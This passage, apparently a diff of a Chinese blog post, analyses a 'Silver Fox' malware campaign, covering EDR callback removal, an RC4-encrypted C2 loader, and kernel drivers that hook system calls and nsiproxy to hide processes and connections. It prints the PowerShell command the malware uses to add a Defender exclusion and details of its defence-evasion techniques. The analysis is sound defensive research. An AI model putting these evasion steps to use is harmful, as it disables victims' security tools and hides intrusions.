+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765172698146-1a78235a-36fc-4038-ac62-0c069db556da.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<pre><code class="hljs language-plain">MmCopyVirtualMemory(
+    CurrentProcess,             // 源进程
+    memOp-&gt;SourceAddress,       // 源地址
+    CurrentProcess,             // 目标进程
+    memOp-&gt;DestinationAddress,  // 目标地址
+    memOp-&gt;Size,                // 大小
+    KernelMode,                 // 权限模式
+    &amp;bytesTransferred
+);
+</code></pre><p>MmCopyVirtualMemory 函数的第六个参数是 AccessMode：</p>
+<ul>
+<li>如果传递 UserMode：Windows 内核会自动检查 SourceAddress 和 DestinationAddress。</li>
+<li>如果传递 KernelMode：Windows 内核会信任调用者，认为这是一个系统内部操作，跳过所有安全检查</li>
+</ul>
+<h3 id="main.exe">main.exe</h3>
+<p>使用程序为：main.exe，源于：<a href="https://github.com/NanoWraith/BlindEdr">https://github.com/NanoWraith/BlindEdr</a></p>
+<p>Cm回调移除方法：</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765178439498-90343a8a-563e-43f9-83bf-a7097a87f619.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>通过特征码进行查到找到目标回调时将 Head-&gt;Flink == Head，这样能直接让链表置空</p>
+<p>Ob回调移除方法：</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765178654656-3dc820d5-49b7-4530-a4b7-7935aedd3420.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>遍历找到 PsProcessType 和 PsThreadType 对象类型结构体在内核中的地址，然后遍历双链表存在目标回调则用0将其覆盖</p>
+<p>进程\线程\基址回调移除方法：</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765178864502-03cad2d1-bef9-4e63-ab8f-df2426b20306.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>直接将内核全局数组中的回调对象指针置空</p>
+<p>Minifilter 回调移除：</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765179197075-581bc758-3d90-4bb7-a6d9-5b43f94eac95.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>遍历了 FLT_VOLUMES 列表如果属于目标edr的 Instance使用Unlink的方法实现回调移除</p>
+<p>移除目标：</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765180407711-12f27701-295f-44f6-b94b-4f6e61d19c5d.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>与源码一致，并未进行修改</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765180443380-836acbd6-2bc9-4a15-9af0-6587d56d6f71.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="nthandlecallback.exe">NtHandleCallback.exe</h2>
+<p>这个样本的实现逻辑与这个样本一致：MD5:<code>08cfaac200ed8052a63020f115c6a75a</code>（这个样本的分析没有对字符串加密更为简单，下文统称为log.dll），这里使用log.dll进行对比分析</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765186338617-ffcb110b-ec0d-4d60-b20b-72db94f1974f.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>采用多线程的方式分别执行解密C2 、向Cndom6.sys发送控制码实现IAT HOOK、添加wdf白名单</p>
+<h3 id="startaddress">StartAddress</h3>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765187118467-98256784-0721-4f3b-973c-8c72bd15d14b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>读取之前释放的Server.log然后进行RC4解密，key为：<code>??Bid@locale@std</code></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765187174746-e61e2f2e-fd62-418d-be32-04adc16df1a4.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>解密成功之后，查找解密之后载荷的NtHandleCallback导出函数，对这个模块进行单独分析</p>
+<p>主要是用于C2连接以及数据接收和发送</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765284768436-6babf81a-2af6-4f70-9223-0b671817eba6.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765202988188-26d63a0a-7bed-4aa8-b777-6af3f0f3a6f3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><code>(v9[4])(v2, &amp;Destination, v10)</code>主要逻辑就是连接，然后接收线程、心跳线程</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765284921556-aa8de441-dc50-48e9-8bf4-99bf31eea8ff.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h3 id="sub_7ff6ce484cb0">sub_7FF6CE484CB0</h3>
+<p>这里使用log.dll进行对比分析</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765196560346-26808c44-7d17-4ed8-8896-ebb733de112a.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>对比到NtHandleCallback.exe中就是</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765330732678-b39554f1-6bb8-45bb-8dc2-1366c4fb6dcb.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>判断系统中的进程分别获取NtHandleCallback、tracerpt、NVIDIA进程PID、然后通过特定驱动对这些进程进行操作</p>
+<p>遍历判断系统中是否存在指定进程</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765330795619-86f8deaf-3c6c-4d47-986b-4487600dde02.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>清理服务之后保证系统环境干净，然后释放驱动，使用StartServiceA启动驱动，在驱动启动之后，立即进行删除（未锁定）</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765331108879-b7385f9d-8a17-458a-bde9-0c0bf4403086.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>后续就是遍历得到目标进程的PID，然后通过DeviceIoControl 发送给指定驱动进行操作（后续的tracerpt、NVIDIA进程操作步骤类似，只需要注意的就是对tracerpt进程进行操作的驱动为XiaoH）</p>
+<h3 id="sub_7ff7efea4f50">sub_7FF7EFEA4F50</h3>
+<p>使用<code>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\Users\Public\Documents'"</code>将<code>C:\Users\Public\Documents</code>路径添加到wdf白名单</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765192822903-f10ffd97-619f-4d24-8efb-1e6093e710be.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_7FF7EFEA4220用于判断是否添加成功，失败则会一直循环添加，成功则退出</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765193026426-c1b3bad6-e87b-4f73-9792-86f6904b1d94.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="cndom6.sys">Cndom6.sys</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765935818461-c33032a9-e5ff-403c-a610-e8e9a8c440ce.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765334157735-09945d13-0aac-4777-a4d5-02e37af23d74.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765334350943-9dded888-0466-4871-806d-b0c03ec6b0bf.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>判断系统时间是否超过2027-01-02，超过就退出运行</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765335052929-1b255a15-6c91-4dee-8b28-5f8ea1800cf1.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>使用ZwSetInformationFile将文件FILE_BASIC_INFORMATION属性清零，同时将SectionObjectPointer清零（SECTION_OBJECT_POINTERS是文件对应的内存映射/节对象指针结构，若文件加载到某个进程，或者被映射为内存映像，会有 ImageSectionObject 指向映像的节对象），调用 MmFlushImageSection 会尝试把文件对应的内存映射从物理内存或页面映射中清空，从而解除对文件的占用</p>
+<p>sub_14000309C函数用于接收用户发送的IOCTL，在NtHandleCallback的分析中发现发送的IOCTL为：0x222180</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765335335604-1d2a035c-40da-4f66-ba04-6f7ed71206ba.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>0x222180是将byte_1400D3669的全局变量置1，应该是后续执行操作的"开关"</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765893909028-df998158-4990-4a4a-bc73-e12e240fa1ef.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>进入sub_140001944</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765893965788-3e88ee59-93f7-4e08-9bd1-3062e3bf5138.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_1400022A4函数就是判断当前系统版本，然后选择合适的offset</p>
+<p>sub_140001F60函数主要是获取NtTraceControl、KeQueryPerformanceCounter、NtQuerySystemInformation、NtOpenProcess、NtOpenThread函数地址，以及通过NtTraceControl定位ntoskrnl.exe基址</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765893847977-7a7471e7-e657-4f44-9f0e-809d1da11ac3.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765894289436-7ea78f8f-b1c6-49be-a13b-fb49a94ae28b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>qword_1400D35C8 =NtTraceControl address</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765894330918-83931c97-2cef-4930-ae5e-4ae55722de83.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>成功定位到ntkrnlmp</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765894609861-7c17f958-9882-4095-a14c-599bdc6fb873.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_140001CB0函数通过特征码寻找KiSystemServiceExitPico</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765895081517-ec9b651d-e8b8-4c98-9221-b1433b86db8b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765895069332-180be2bf-fb83-4c05-b86a-88662f46ada0.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>后续是通过KiSystemServiceExitPico寻找win32k.sys</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945690338-e9a9c4b5-d5fb-4847-8036-ea1eafda3018.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>然后 利用 KeQueryPerformanceCounter 地址寻找 HAL.dll 或 ntoskrnl</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945813339-d172750a-b50b-4bc5-a326-06c833e5f3c9.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945843668-e69177e1-6d83-435a-8211-1c0df54cb32e.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_140001A18函数用于寻找GetCpuClock指针</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945873927-45d11bd9-19e4-4cf6-96cd-172ee0f6aad6.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945884605-11414ea2-805a-4c73-b468-a14fa274ac0d.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_140002880函数主要用于遍历SSDT表</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765945963142-3e3a3993-4fa6-46c4-946b-7a7318d0b54c.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765946025058-582b9431-176a-4d10-a55e-187010dd3317.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765535622223-9191621f-52f1-43fa-a5ed-44d32d360c57.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>csrss.exe进程拥有 Shadow SSDT</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765536090739-09f95ecd-a5f4-4d8c-98f6-d2bddea9affa.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765950315926-1de91568-9c86-4a14-9b2a-fca9927ffeb2.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_1400035C8函数为创建系统线程，sub_1400035C8函数负责HOOK</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765950152639-a3eabc26-7d12-464f-a12b-a39c852984a4.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765950575166-e31451f3-d659-4aa8-b6f0-a4b17f6b6725.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>HOOK分发函数，主要HOOK了NtQuerySystemInformation、NtOpenProcess、NtReadVirtualMemory</p>
+<p>针对于NtQuerySystemInformation，判断是否为保护名单中的程序，如果是则进行Unlink操作，然后达到隐藏进程的目的</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765957011258-eab26ebe-3248-450b-8e2e-26fb5b38e27b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765959640108-db92d6b7-f8de-49cb-8c74-952630f52448.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>处于Unlink函数，查看白名单为空，查看需要隐藏的进程为0x00001960（就是NtHandleCallback.exe的PID）</p>
+<p>Unlink的结构体为</p>
+<pre><code class="hljs language-c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">SYSTEM_PROCESS_INFORMATION_REVERSED</span> {</span>
+    <span class="hljs-comment">// Dump: 00003340</span>
+    ULONG NextEntryOffset;       <span class="hljs-comment">// [Offset: +0x00]</span>
+
+    ULONG NumberOfThreads;          <span class="hljs-comment">// [Offset: +0x04]</span>
+    
+    LARGE_INTEGER WorkingSetPrivateSize;    <span class="hljs-comment">// [Offset: +0x08]</span>
+
+    <span class="hljs-comment">// [Offset: +0x10]</span>
+    ULONG HardFaultCount;
+    ULONG NumberOfThreadsHighWatermark;
+
+    <span class="hljs-comment">// [Offset: +0x18]</span>
+    ULONGLONG CycleTime;
+
+    <span class="hljs-comment">// [Offset: +0x20]</span>
+    LARGE_INTEGER CreateTime;
+
+    <span class="hljs-comment">// [Offset: +0x28]</span>
+    LARGE_INTEGER UserTime;
+
+    <span class="hljs-comment">// [Offset: +0x30]</span>
+    LARGE_INTEGER KernelTime;
+
+    <span class="hljs-comment">// [Offset: +0x38]</span>
+    UNICODE_STRING ImageName; 
+
+    <span class="hljs-comment">// [Offset: +0x48]</span>
+    KPRIORITY BasePriority;
+
+    <span class="hljs-comment">// [Offset: +0x50] </span>
+    HANDLE UniqueProcessId;
+
+    <span class="hljs-comment">// [Offset: +0x58]</span>
+    HANDLE InheritedFromUniqueProcessId;
+
+    <span class="hljs-comment">// [Offset: +0x60]</span>
+    ULONG HandleCount;
+<span class="hljs-comment">//…………………………</span>
+
+} SYSTEM_PROCESS_INFORMATION_REVERSED, *PSYSTEM_PROCESS_INFORMATION_REVERSED;
+</code></pre><pre><code class="hljs language-c"><span class="hljs-number">1</span>: kd&gt; dps r9
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>ac8  <span class="hljs-number">00000002</span>`<span class="hljs-number">00000328</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>ad0  <span class="hljs-number">00000000</span>`<span class="hljs-number">0003f</span>000
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>ad8  <span class="hljs-number">00000004</span>`<span class="hljs-number">0000008</span>c
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>ae0  <span class="hljs-number">00000000</span>`<span class="hljs-number">35468991</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>ae8  <span class="hljs-number">01</span>dc6f2a`ff7df2a3
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>af0  <span class="hljs-number">00000000</span>`<span class="hljs-number">0002625</span>a
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>af8  <span class="hljs-number">00000000</span>`<span class="hljs-number">000b</span>ebc2
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>00  <span class="hljs-number">00000000</span>`<span class="hljs-number">00180010</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>08  <span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>dd8
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>10  <span class="hljs-number">00000000</span>`<span class="hljs-number">0000000b</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>18  <span class="hljs-number">00000000</span>`<span class="hljs-number">0000015</span>c
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>20  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000004</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>28  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000035</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>30  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>38  <span class="hljs-number">00000201</span>`<span class="hljs-number">03117000</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>40  <span class="hljs-number">00000201</span>`<span class="hljs-number">028</span>ab000
+<span class="hljs-number">1</span>: kd&gt; r r9
+r9=<span class="hljs-number">000001f</span>f82755ac8
+<span class="hljs-number">1</span>: kd&gt; dps <span class="hljs-number">000001f</span>f82755ac8+<span class="hljs-number">0x328</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>df0  <span class="hljs-number">0000000</span>c`<span class="hljs-number">00000648</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>df8  <span class="hljs-number">00000000</span>`<span class="hljs-number">000</span>da000
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e00</span>  <span class="hljs-number">0000000f</span>`<span class="hljs-number">000000f</span>d
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e08</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">5854e8</span>df
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e10</span>  <span class="hljs-number">01</span>dc6f2b`<span class="hljs-number">002</span>c11d1
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e18</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">0007270</span>e
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e20</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">002</span>aea54
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e28</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00180012</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e30</span>  <span class="hljs-number">000001f</span>f`<span class="hljs-number">82756420</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e38</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">0000000</span>d
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e40</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">000001</span>dc
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e48</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">000001</span>d0
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e50</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">0000022</span>c
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e58</span>  <span class="hljs-number">00000000</span>`<span class="hljs-number">00000000</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e60</span>  <span class="hljs-number">00000201</span>`<span class="hljs-number">05f</span>33000
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755e68</span>  <span class="hljs-number">00000201</span>`<span class="hljs-number">05e74000</span>
+
+<span class="hljs-number">1</span>: kd&gt; du <span class="hljs-number">000001f</span>f82755dd8
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>dd8  <span class="hljs-string">"smss.exe"</span>
+<span class="hljs-number">1</span>: kd&gt; dps <span class="hljs-number">000001f</span>f82755b08 l1
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82755b</span>08  <span class="hljs-number">000001f</span>f`<span class="hljs-number">82755</span>dd8
+<span class="hljs-number">1</span>: kd&gt; du <span class="hljs-number">000001f</span>f`<span class="hljs-number">82756420</span>
+<span class="hljs-number">000001f</span>f`<span class="hljs-number">82756420</span>  <span class="hljs-string">"csrss.exe"</span>
+</code></pre><p>目标进程</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765962274119-002ae2f8-cf8a-44b5-9ae4-387368698282.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>针对NtOpenProcess，判断是否为保护进程（也就是从用户端通过IOCTL传入的进程PID），如果为保护进程则返回错误码，从而防止其他进程访问该进程的句柄</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765957863111-7d19f2eb-7f7d-4d3d-b1a3-e60483d60e7b.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>针对NtReadVirtualMemory，判断是否为保护进程，如果是保护进程则返回错误码，从而防止保护进程的句柄被复制</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765962331931-81eed4fd-3029-4fde-b14f-c1180a2870cb.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<h2 id="xiaoh.sys">XiaoH.sys</h2>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765196519176-58aa0055-b2f4-4cb1-a5e6-78ba573b212e.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765963239251-c0b197f5-618c-49ce-a128-5378d8b06115.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765198281113-ef4bfd94-820b-45ec-914f-2d9361a4294c.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765964858757-4a0a8c40-97d5-447e-9e66-09b72f619deb.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>sub_140001514函数用于寻找nsiproxy基址</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765964912060-b66adc7d-55dd-4f6b-9ddc-883941b80621.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>针对nsiproxy.sys系统驱动文件，获取其驱动对象对IRP_MJ_DEVICE_CONTROL进行HOOK</p>
+<p>nsiproxy.sys 是 Windows 内核里的一个 网络服务代理驱动</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765967641310-a316037c-4bc0-440d-9cac-5043cca865ad.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<p>遍历网络连接表，判断是否为目标PID</p>
+<p><img src="/assets/posts/%E9%93%B6%E7%8B%90-10%E6%9C%88/images/1765967670857-ca814229-28ca-4d58-995f-297cc867d16e.png" alt="银狐 10月" loading="lazy" decoding="async"></p>
+<pre><code class="hljs language-c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">NSI_TCP_SUBENTRY</span> {</span>
+    <span class="hljs-comment">// 0x00</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> State;           
+
+    <span class="hljs-comment">// 0x04</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> LocalAddress;    
+
+    <span class="hljs-comment">// 0x08</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> LocalPort;     
+
+    <span class="hljs-comment">//  0x0A</span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> RemotePort;    
+
+    <span class="hljs-comment">// 0x0C: </span>
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> RemoteAddress;   
+
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Unknown1;       
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> Unknown2;  
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> Timestamp;
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> Unknown3;  
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> Unknown4; 
+    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> Unknown5;    
+
+} NSI_TCP_SUBENTRY, *PNSI_TCP_SUBENTRY;
+</code></pre></div><footer class="article-footer"><div><span>本文链接</span><a href="https://ycr0w.github.io/2026/08/13/%E9%93%B6%E7%8B%90-10%E6%9C%88/">https://ycr0w.github.io/2026/08/13/%E9%93%B6%E7%8B%90-10%E6%9C%88/</a></div></footer></article>
+    <aside class="article-aside"><div class="toc"><span>目录</span><a class="toc-level-2" href="#yifanyi_setup.exe">YiFanyi_setup.exe</a><a class="toc-level-2" href="#funzip.exe">funzip.exe</a><a class="toc-level-2" href="#men.exe">men.exe</a><a class="toc-level-3" href="#%E9%87%8A%E6%94%BEtree%E5%B9%B6%E8%BF%9B%E8%A1%8C%E8%A7%A3%E5%8E%8B">释放tree并进行解压</a><a class="toc-level-3" href="#%E9%87%8A%E6%94%BEedr%E5%B9%B6%E8%A7%A3%E5%8E%8B">释放edr并解压</a><a class="toc-level-3" href="#%E8%BF%90%E8%A1%8Cbypass.exe">运行bypass.exe</a><a class="toc-level-3" href="#%E7%A6%81%E7%94%A8%E7%BD%91%E7%BB%9C%E9%80%82%E9%85%8D%E5%99%A8%E5%B9%B6%E8%BF%90%E8%A1%8Cnvidia.exe">禁用网络适配器并运行NVIDIA.exe</a><a class="toc-level-3" href="#%E9%87%8A%E6%94%BEme%E5%B9%B6%E8%A7%A3%E5%8E%8B-%E5%90%8C%E6%97%B6%E5%90%AF%E5%8A%A8nthandlecallback">释放me并解压，同时启动NtHandleCallback</a><a class="toc-level-3" href="#%E6%B3%A8%E5%86%8Crwdriver-%E5%B9%B6%E5%90%AF%E5%8A%A8main.exe">注册rwdriver、并启动main.exe</a><a class="toc-level-3" href="#%E5%88%A0%E9%99%A4%E8%A1%8D%E7%94%9F%E6%96%87%E4%BB%B6">删除衍生文件</a><a class="toc-level-2" href="#bypass.exe">Bypass.exe</a><a class="toc-level-2" href="#nvidia.exe">NVIDIA.exe</a><a class="toc-level-2" href="#bdapiutil64.sys">BdApiUtil64.sys</a><a class="toc-level-3" href="#kgsekkdkce.exe">KGseKKdKce.exe</a><a class="toc-level-2" href="#rwdriver.sys">rwdriver.sys</a><a class="toc-level-3" href="#main.exe">main.exe</a><a class="toc-level-2" href="#nthandlecallback.exe">NtHandleCallback.exe</a><a class="toc-level-3" href="#startaddress">StartAddress</a><a class="toc-level-3" href="#sub_7ff6ce484cb0">sub_7FF6CE484CB0</a><a class="toc-level-3" href="#sub_7ff7efea4f50">sub_7FF7EFEA4F50</a><a class="toc-level-2" href="#cndom6.sys">Cndom6.sys</a><a class="toc-level-2" href="#xiaoh.sys">XiaoH.sys</a></div></aside>
+    <nav class="post-navigation"><a href="/2026/08/13/winos-4.0/"><i data-lucide="arrow-left" aria-hidden="true"></i><span><small>上一篇</small>Winos 4.0</span></a></nav>
+  </main>
+  <footer class="site-footer"><span>© 2026 YCr0w</span></footer>
+</body>
+</html>
